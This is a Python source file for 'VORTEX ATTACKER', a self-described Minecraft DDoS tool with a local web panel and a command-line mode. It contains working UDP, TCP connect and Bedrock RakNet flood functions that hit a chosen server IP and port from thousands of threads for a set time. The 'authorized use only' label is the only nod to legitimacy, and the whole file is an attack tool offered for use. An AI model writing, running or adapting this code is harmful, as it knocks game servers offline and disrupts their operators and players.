#!/usr/bin/env python3
# VORTEX ATTACKER - Minecraft DDoS Tool
# Web Panel + CLI Attack

import socket
import threading
import random
import sys
import time
import os
import json
from http.server import HTTPServer, BaseHTTPRequestHandler

# Configuration
VERSION = "1.0"
AUTHOR = "Vortex"

# Store attack status
active_attacks = {}
attack_logs = []

# UDP Flood
def udp_flood(ip, port, stop_event):
    data = random._urandom(1024)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        try:
            sock.sendto(data, (ip, port))
        except:
            pass

# TCP SYN Flood
def syn_flood(ip, port, stop_event):
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect((ip, port))
            sock.send(b"\x00"*16)
            sock.close()
        except:
            pass

# Bedrock Raknet Flood
def bedrock_flood(ip, port, stop_event):
    packet = b'\x01\x00\x00\x00' + b'\x00'*32
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        try:
            sock.sendto(packet, (ip, port))
        except:
            pass

# Start attack
def start_attack(target_ip, target_port, attack_type, threads, duration):
    attack_id = str(int(time.time()))
    stop_event = threading.Event()
    
    attack_func = None
    if attack_type == "udp":
        attack_func = udp_flood
    elif attack_type == "syn":
        attack_func = syn_flood
    elif attack_type == "bedrock":
        attack_func = bedrock_flood
    else:
        return None
    
    # Launch threads
    for _ in range(threads):
        t = threading.Thread(target=attack_func, args=(target_ip, target_port, stop_event))
        t.daemon = True
        t.start()
    
    # Store attack info
    active_attacks[attack_id] = {
        "stop_event": stop_event,
        "ip": target_ip,
        "port": target_port,
        "type": attack_type,
        "threads": threads,
        "start_time": time.time(),
        "duration": duration
    }
    
    # Auto-stop after duration
    def auto_stop():
        time.sleep(duration)
        if attack_id in active_attacks:
            stop_event.set()
            del active_attacks[attack_id]
            attack_logs.append(f"Attack finished: {target_ip}:{target_port}")
    
    threading.Thread(target=auto_stop, daemon=True).start()
    return attack_id

# Web Panel Handler
class VortexPanelHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(HTML_PANEL.encode())
        elif self.path == "/status":
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            status = {
                "active_attacks": len(active_attacks),
                "attacks": list(active_attacks.keys()),
                "logs": attack_logs[-10:]
            }
            self.wfile.write(json.dumps(status).encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == "/attack":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data)
            
            result = start_attack(
                data['ip'],
                int(data['port']),
                data['type'],
                int(data['threads']),
                int(data['duration'])
            )
            
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"success": True, "attack_id": result}).encode())
    
    def log_message(self, format, *args):
        pass

# HTML Panel
HTML_PANEL = """
<!DOCTYPE html>
<html>
<head>
    <title>VORTEX ATTACKER - Minecraft DDoS Panel</title>
    <style>
        body { background: #0a0a0a; color: #0f0; font-family: monospace; margin: 0; padding: 20px; }
        .container { max-width: 800px; margin: 0 auto; background: #111; padding: 20px; border-radius: 10px; border: 1px solid #0f0; }
        h1 { color: #0f0; text-align: center; text-shadow: 0 0 5px #0f0; }
        input, select, button { background: #222; color: #0f0; border: 1px solid #0f0; padding: 10px; margin: 5px; font-family: monospace; }
        button { cursor: pointer; background: #0a2a0a; }
        button:hover { background: #0f3f0f; }
        .status { background: #0a0a0a; padding: 10px; margin-top: 20px; border: 1px solid #333; }
        .active { color: #ff0; }
        .log { color: #aaa; font-size: 12px; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #555; }
    </style>
</head>
<body>
<div class="container">
    <h1>🌀 VORTEX ATTACKER v1.0</h1>
    <h3>Minecraft DDoS Tool | Authorized Use Only</h3>
    
    <div class="attack-form">
        <input type="text" id="ip" placeholder="Server IP or Domain" style="width: 60%;">
        <input type="number" id="port" placeholder="Port" value="25565" style="width: 15%;">
        <select id="type" style="width: 20%;">
            <option value="tcp">TCP Flood (Java)</option>
            <option value="udp">UDP Flood</option>
            <option value="bedrock">Bedrock Flood (PE)</option>
        </select><br>
        <input type="number" id="threads" placeholder="Threads (1000-20000)" value="5000" style="width: 48%;">
        <input type="number" id="duration" placeholder="Duration (seconds)" value="60" style="width: 48%;"><br>
        <button onclick="startAttack()" style="width: 98%;">🔥 START ATTACK 🔥</button>
    </div>
    
    <div class="status">
        <div><span class="active">🟢 Active Attacks:</span> <span id="active-count">0</span></div>
        <div id="logs" class="log">Logs: Ready</div>
    </div>
    
    <div class="footer">
        Vortex Attacker | For authorized testing only | Non-Root Termux
    </div>
</div>

<script>
    function startAttack() {
        let data = {
            ip: document.getElementById('ip').value,
            port: document.getElementById('port').value,
            type: document.getElementById('type').value,
            threads: document.getElementById('threads').value,
            duration: document.getElementById('duration').value
        };
        
        fetch('/attack', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        }).then(r => r.json()).then(data => {
            alert('Attack started! ID: ' + data.attack_id);
            updateStatus();
        });
    }
    
    function updateStatus() {
        fetch('/status').then(r => r.json()).then(data => {
            document.getElementById('active-count').innerText = data.active_attacks;
            if(data.logs.length > 0) {
                document.getElementById('logs').innerHTML = 'Logs: ' + data.logs.join('<br>');
            }
        });
    }
    
    setInterval(updateStatus, 3000);
    updateStatus();
</script>
</body>
</html>
"""

# Main function
def main():
    print("=" * 60)
    print("    VORTEX ATTACKER - Minecraft DDoS Tool")
    print("    Version 1.0 | Authorized Use Only")
    print("=" * 60)
    print("\n[1] Start Web Panel (Local)")
    print("[2] CLI Attack Mode")
    print("[3] Exit")
    
    choice = input("\nSelect: ")
    
    if choice == "1":
        port = int(input("Panel port (default 8080): ") or 8080)
        print(f"\n[+] Panel started at http://localhost:{port}")
        print("[+] Open this URL in your browser")
        print("[+] Press Ctrl+C to stop\n")
        server = HTTPServer(('0.0.0.0', port), VortexPanelHandler)
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            print("\n[+] Panel stopped")
    elif choice == "2":
        ip = input("Target IP: ")
        port = int(input("Target port (25565 for Java, 19132 for Bedrock): "))
        threads = int(input("Threads (1000-20000): "))
        duration = int(input("Duration (seconds): "))
        attack_type = input("Attack type (tcp/udp/bedrock): ").lower()
        start_attack(ip, port, attack_type, threads, duration)
        print(f"[+] Attack running for {duration} seconds...")
        time.sleep(duration)
        print("[+] Attack finished")
    else:
        sys.exit(0)

if __name__ == "__main__":
    main()
